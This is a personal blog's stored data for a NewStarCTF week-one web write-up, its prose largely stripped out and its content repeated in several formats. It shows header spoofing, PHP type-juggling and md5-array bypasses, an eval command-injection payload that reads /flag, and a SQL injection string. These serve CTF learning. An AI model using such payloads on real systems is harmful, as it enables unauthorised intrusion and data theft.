www.zip\n\n![-1665405645261](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png)\n\n![-1665405650443](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png)\n![-1665405656120](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png)\n\nflag\n\ndirsearchbuu\n\n# 4.NotPHP\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\"){\n    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){\n        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){\n            echo \"Hack Me\";\n            eval(\"#\".$_GET['cmd']);\n        }else{\n            die(\"Number error!\");\n        }\n    }else{\n        die(\"Wrong Key!\");\n    }\n}else{\n    die(\"Pass it!\");\n} Pass it!\n```\n\nphp\n\n\n\n```php\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\")\n```\n\n[file_get_contents](https://blog.csdn.net/qq_45290991/article/details/113852174)\n\n[php](https://www.cnblogs.com/linfangnan/p/13535097.html)\n\ndata\n\n```php\n?data=data://text/plain,Welcome to CTF\n```\n\n\n\n```php\nif(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2'])\n```\n\nkey1key2md5key1key2md5\n\n[md5](https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7)\n\nkey1key2md500===0\n\n```php\nkey1[]=1&key2[]=2\n```\n\n\n\n```php\nif(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077)\n```\n\nis_numeric\n\nintval() \n\nnumnum=2077==\n\nnum=2077a\n\n```php\nnum=2077a\n```\n\nintval(2077a)=2077\n\n\n\n```php\neval(\"#\".$_GET['cmd']);\n```\n\nrce#\n\n\n\n1.?>\n\n2.%0a\n\n %20\n\n```php\n&cmd=%0asystem('cat%20/flag');\n```\n\n```php\n&cmd=?><?system('cat%20/flag');\n```\n\nflag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}\n\n# 5.Word-For-You\n\n![-1665405676352](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png)\n\nsql\n\n```\n1' or 1=1#\n```\n\n![-1665405683499](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png)\n\nsql\n\n[sql](https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142^v50^pc_rank_34_1,201^v3^add_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)\n\n<br/>\n\n<br/>\n\n","source":"_posts/NewStarCTF WEEK1 WEB.md","raw":"---\ntitle: NewStarCTF WEEK1 WEB\ndate: 2022-10-07 21:54:12\nexcerpt: NewStarCTF WEEK1 WEB\ncategories: \n---\n\n\n\n# 1.HTTP\n\n![-1665405504740](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png)\n\nget nameget\n\nget\n\n**?++=+**\n\nnamename\n\n?name=1\n\n![-1665405531405](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png)\n\npostkeykey\n\nF12htmlkey\n\n![-1665405550865](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png)\n\npostkey=ctfisgoodposturl\n\n![-1665405558353](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png)\n\nbpkey=ctfisgoodresponseadmin\n\ncookieuser=guestuser=admin\n\n\n\nflag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}\n\n# 2.Head?Header!\n\n![-1665405589688](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png)\n\nCTFbp\n\n![-1665405599681](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png)\n\nctf.com'referer\n\n> Referer    HTTP  header web   Referer  www.google.com www.baidu.com www.baidu.com header \n>\n> ```\n> Referer=http://www.google.com\n> ```\n>\n>  Referer  \n\n[referer](https://blog.csdn.net/shenqueying/article/details/79426884)\n\n\n\n**referer:ctf.com**\n\n![-1665405614966](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png)\n\nlocalphpX-Forward-For\n\n[X-Forwarded-For](https://www.jianshu.com/p/15f3498a7fad)\n\n\n\n**X-Fordward-For:127.0.0.1**\n\n127.0.0.1\n\n![-1665405624087](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png)\n\nflag{d0637815-c4fc-4aa4-a842-06ebfc22817b}\n\n# 3.\n\n![-1665405631706](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png)\n\nflag\n\n\n\nrobots.txt .index.php.swp www.zip index.php~ \n\nrobots.txt .index.php.swp www.zip\n\n![-1665405645261](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png)\n\n![-1665405650443](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png)\n![-1665405656120](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png)\n\nflag\n\ndirsearchbuu\n\n# 4.NotPHP\n\n```php\n <?php\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\"){\n    if(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2']){\n        if(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077){\n            echo \"Hack Me\";\n            eval(\"#\".$_GET['cmd']);\n        }else{\n            die(\"Number error!\");\n        }\n    }else{\n        die(\"Wrong Key!\");\n    }\n}else{\n    die(\"Pass it!\");\n} Pass it!\n```\n\nphp\n\n\n\n```php\nif(file_get_contents($_GET['data']) == \"Welcome to CTF\")\n```\n\n[file_get_contents](https://blog.csdn.net/qq_45290991/article/details/113852174)\n\n[php](https://www.cnblogs.com/linfangnan/p/13535097.html)\n\ndata\n\n```php\n?data=data://text/plain,Welcome to CTF\n```\n\n\n\n```php\nif(md5($_GET['key1']) === md5($_GET['key2']) && $_GET['key1'] !== $_GET['key2'])\n```\n\nkey1key2md5key1key2md5\n\n[md5](https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7)\n\nkey1key2md500===0\n\n```php\nkey1[]=1&key2[]=2\n```\n\n\n\n```php\nif(!is_numeric($_POST['num']) && intval($_POST['num']) == 2077)\n```\n\nis_numeric\n\nintval() \n\nnumnum=2077==\n\nnum=2077a\n\n```php\nnum=2077a\n```\n\nintval(2077a)=2077\n\n\n\n```php\neval(\"#\".$_GET['cmd']);\n```\n\nrce#\n\n\n\n1.?>\n\n2.%0a\n\n %20\n\n```php\n&cmd=%0asystem('cat%20/flag');\n```\n\n```php\n&cmd=?><?system('cat%20/flag');\n```\n\nflag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}\n\n# 5.Word-For-You\n\n![-1665405676352](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png)\n\nsql\n\n```\n1' or 1=1#\n```\n\n![-1665405683499](https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png)\n\nsql\n\n[sql](https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142^v50^pc_rank_34_1,201^v3^add_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187)\n\n<br/>\n\n<br/>\n\n","slug":"NewStarCTF WEEK1 WEB","published":1,"updated":"2024-04-17T08:42:59.614Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7ib0005h776cqcn18a7","content":"<h1 id=\"1-HTTP\"><a href=\"#1-HTTP\" class=\"headerlink\" title=\"1.HTTP\"></a>1.HTTP</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png\"\n                        alt=\"-1665405504740\"\n                 ></p>\n<p>get nameget</p>\n<p>get</p>\n<p><strong>?++&#x3D;+</strong></p>\n<p>namename</p>\n<p>?name&#x3D;1</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png\"\n                        alt=\"-1665405531405\"\n                 ></p>\n<p>postkeykey</p>\n<p>F12htmlkey</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png\"\n                        alt=\"-1665405550865\"\n                 ></p>\n<p>postkey&#x3D;ctfisgoodposturl</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png\"\n                        alt=\"-1665405558353\"\n                 ></p>\n<p>bpkey&#x3D;ctfisgoodresponseadmin</p>\n<p>cookieuser&#x3D;guestuser&#x3D;admin</p>\n<p>flag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}</p>\n<h1 id=\"2-Head-Header\"><a href=\"#2-Head-Header\" class=\"headerlink\" title=\"2.Head?Header!\"></a>2.Head?Header!</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png\"\n                        alt=\"-1665405589688\"\n                 ></p>\n<p>CTFbp</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png\"\n                        alt=\"-1665405599681\"\n                 ></p>\n<p>ctf.comreferer</p>\n<blockquote>\n<p>Referer    HTTP  header web   Referer  <a class=\"link\"   href=\"http://www.google.com/\" >www.google.com<i class=\"fas fa-external-link-alt\"></i></a> <a class=\"link\"   href=\"http://www.baidu.com/\" >www.baidu.com<i class=\"fas fa-external-link-alt\"></i></a> <a class=\"link\"   href=\"http://www.baidu.com/\" >www.baidu.com<i class=\"fas fa-external-link-alt\"></i></a> header </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Referer=http://www.google.com</span><br></pre></td></tr></table></figure>\n\n<p> Referer  </p>\n</blockquote>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/shenqueying/article/details/79426884\" >referer<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<p><strong>referer:ctf.com</strong></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656077.png\"\n                        alt=\"-1665405614966\"\n                 ></p>\n<p>localphpX-Forward-For</p>\n<p><a class=\"link\"   href=\"https://www.jianshu.com/p/15f3498a7fad\" >X-Forwarded-For<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p></p>\n<p><strong>X-Fordward-For:127.0.0.1</strong></p>\n<p>127.0.0.1</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656892.png\"\n                        alt=\"-1665405624087\"\n                 ></p>\n<p>flag{d0637815-c4fc-4aa4-a842-06ebfc22817b}</p>\n<h1 id=\"3-\"><a href=\"#3-\" class=\"headerlink\" title=\"3.\"></a>3.</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657077.png\"\n                        alt=\"-1665405631706\"\n                 ></p>\n<p>flag</p>\n<p></p>\n<p>robots.txt .index.php.swp <a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a> index.php~ </p>\n<p>robots.txt .index.php.swp <a class=\"link\"   href=\"http://www.zip/\" >www.zip<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657703.png\"\n                        alt=\"-1665405645261\"\n                 ></p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657351.png\"\n                        alt=\"-1665405650443\"\n                 ><br><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657336.png\"\n                        alt=\"-1665405656120\"\n                 ></p>\n<p>flag</p>\n<p>dirsearchbuu</p>\n<h1 id=\"4-NotPHP\"><a href=\"#4-NotPHP\" class=\"headerlink\" title=\"4.NotPHP\"></a>4.NotPHP</h1><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"title function_ invoke__\">highlight_file</span>(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">&quot;Welcome to CTF&quot;</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Hack Me&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Number error!&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Wrong Key!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Pass it!&quot;</span>);</span><br><span class=\"line\">&#125; Pass it!</span><br></pre></td></tr></table></figure>\n\n<p>php</p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>]) == <span class=\"string\">&quot;Welcome to CTF&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><a class=\"link\"   href=\"https://blog.csdn.net/qq_45290991/article/details/113852174\" >file_get_contents<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p><a class=\"link\"   href=\"https://www.cnblogs.com/linfangnan/p/13535097.html\" >php<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>data</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?data=data:<span class=\"comment\">//text/plain,Welcome to CTF</span></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>]) === <span class=\"title function_ invoke__\">md5</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>]) &amp;&amp; <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key1&#x27;</span>] !== <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;key2&#x27;</span>])</span><br></pre></td></tr></table></figure>\n\n<p>key1key2md5key1key2md5</p>\n<p><a class=\"link\"   href=\"https://bbs.huaweicloud.com/blogs/319030#:~:text=%E6%95%B0%E7%BB%84%E7%BB%95%E8%BF%87%20md5%E4%B8%8D%E8%83%BD%E5%8A%A0%E5%AF%86%E6%95%B0%E7%BB%84%2C%E4%BC%A0%E5%85%A5%E6%95%B0%E7%BB%84%E4%BC%9A%E6%8A%A5%E9%94%99%2C%E4%BD%86%E4%BC%9A%E7%BB%A7%E7%BB%AD%E6%89%A7%E8%A1%8C%E5%B9%B6%E4%B8%94%E8%BF%94%E5%9B%9E%E7%BB%93%E6%9E%9C%E4%B8%BAnull%20%E6%AF%94%E5%A6%82%E5%B0%86%E4%B8%A4%E4%B8%AA%E6%95%B0%E7%BB%84%E7%9A%84md5%E5%80%BC%E8%BF%9B%E8%A1%8C%E6%AF%94%E8%BE%83,md5%28a%5B%5D%3D1%29%20%3D%3D%3D%20md5%28b%5B%5D%3D1%29%20%E7%94%B1%E4%BA%8Emd5%E5%87%BD%E6%95%B0%E6%97%A0%E6%B3%95%E5%A4%84%E7%90%86%E6%95%B0%E7%BB%84%2C%E4%BC%9A%E8%BF%94%E5%9B%9Enull%2C%E6%89%80%E4%BB%A5md5%E5%8A%A0%E5%AF%86%E5%90%8E%E7%9A%84%E7%BB%93%E6%9E%9C%E6%98%AF%E4%B8%8B%E9%9D%A2%E8%BF%99%E6%A0%B7\" >md5<i class=\"fas fa-external-link-alt\"></i></a></p>\n<p>key1key2md500&#x3D;&#x3D;&#x3D;0</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key1[]=<span class=\"number\">1</span>&amp;key2[]=<span class=\"number\">2</span></span><br></pre></td></tr></table></figure>\n\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"title function_ invoke__\">is_numeric</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) &amp;&amp; <span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;num&#x27;</span>]) == <span class=\"number\">2077</span>)</span><br></pre></td></tr></table></figure>\n\n<p>is_numeric</p>\n<p>intval() </p>\n<p>numnum&#x3D;2077&#x3D;&#x3D;</p>\n<p>num&#x3D;2077a</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">num=<span class=\"number\">2077</span>a</span><br></pre></td></tr></table></figure>\n\n<p>intval(2077a)&#x3D;2077</p>\n<p></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">&quot;#&quot;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure>\n\n<p>rce#</p>\n<p></p>\n<p>1.?&gt;</p>\n<p>2.%0a</p>\n<p> %20</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;cmd=%<span class=\"number\">0</span>asystem(<span class=\"string\">&#x27;cat%20/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&amp;cmd=<span class=\"meta\">?&gt;</span><span class=\"meta\">&lt;?</span><span class=\"title function_ invoke__\">system</span>(<span class=\"string\">&#x27;cat%20/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>flag{cd5e5ad9-1861-4bda-bcd5-bc729f7f953c}</p>\n<h1 id=\"5-Word-For-You\"><a href=\"#5-Word-For-You\" class=\"headerlink\" title=\"5.Word-For-You\"></a>5.Word-For-You</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657645.png\"\n                        alt=\"-1665405676352\"\n                 ></p>\n<p>sql</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>\n\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161657484.png\"\n                        alt=\"-1665405683499\"\n                 ></p>\n<p>sql</p>\n<p><a class=\"link\"   href=\"https://blog.csdn.net/yujia_666/article/details/90296495?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166429318116782427488623%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166429318116782427488623&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-90296495-null-null.142%5Ev50%5Epc_rank_34_1,201%5Ev3%5Eadd_ask&utm_term=sql%E6%B3%A8%E5%85%A5&spm=1018.2226.3001.4187\" >sql<i class=\"fas fa-external-link-alt\"></i></a></p>\n<br/>\n\n<br/>\n\n<p></p>\n","site":{"data":{"keep":{"base_info":{"primary_color":"#0066cc","title":"P1taya","author":"P1taya","avatar":"/images/p1taya.jpg","logo":"/images/p1taya.jpg","favicon":"/images/p1taya.jpg"},"menu":{"home":"/ || fa-solid fa-home","archives":"/archives || fa-solid fa-box-archive","categories":"/categories || fa-solid fa-layer-group","links":"/links || fa-solid fa-link","about":"/about || fa-solid fa-user-graduate","photos":"/photos || fa-solid fa-image"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":" || ","hitokoto":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created || fa-solid fa-home","post_datetime_format":"YYYY-MM-DD HH:mm:ss"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":false},"lazyload":{"enable":true},"footer":{"since":2022,"word_count":true},"inject":{"enable":true,"css":["/css/demo1.css"],"js":[null]}},"links":[{"name":"dog","link":"https://wuster.store/","avatar":"https://wuster.store/images/favicon.ico"},{"name":"","link":"https://fushuling.com/","avatar":"https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/avatar.jpg"}]}},"more":"<h1 id=\"1-HTTP\"><a href=\"#1-HTTP\" class=\"headerlink\" title=\"1.HTTP\"></a>1.HTTP</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655204.png\"\n                        alt=\"-1665405504740\"\n                 ></p>\n<p>get nameget</p>\n<p>get</p>\n<p><strong>?++&#x3D;+</strong></p>\n<p>namename</p>\n<p>?name&#x3D;1</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655983.png\"\n                        alt=\"-1665405531405\"\n                 ></p>\n<p>postkeykey</p>\n<p>F12htmlkey</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655026.png\"\n                        alt=\"-1665405550865\"\n                 ></p>\n<p>postkey&#x3D;ctfisgoodposturl</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161655803.png\"\n                        alt=\"-1665405558353\"\n                 ></p>\n<p>bpkey&#x3D;ctfisgoodresponseadmin</p>\n<p>cookieuser&#x3D;guestuser&#x3D;admin</p>\n<p>flag{ed52ca0c-40c7-4c7e-bfd7-d4f2cbbd2435}</p>\n<h1 id=\"2-Head-Header\"><a href=\"#2-Head-Header\" class=\"headerlink\" title=\"2.Head?Header!\"></a>2.Head?Header!</h1><p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656086.png\"\n                        alt=\"-1665405589688\"\n                 ></p>\n<p>CTFbp</p>\n<p><img  \n                       lazyload\n                       alt=\"image\"\n                       data-src=\"https://cdn.jsdelivr.net/gh/R3damancy1/blog-pic/202404161656618.png\"\n                        alt=\"-1665405599681\"\n                 ></p>\n<p>ctf.comreferer</p>\n<blockquote>\n<p>Referer    HTTP  header web   Referer  <a class=\"link\"   href=\"http://www.google.com/\" >www.google.com<i class=\"fas fa-external-link-alt\"></i></a> <a class=\"link\"   href=\"http://www.baidu.com/\" >www.baidu.com<i class=\"fas fa-external-link-alt\"></i></a> <a class=\"link\"   href=\"http://www.baidu.com/\" >www.baidu.com<i 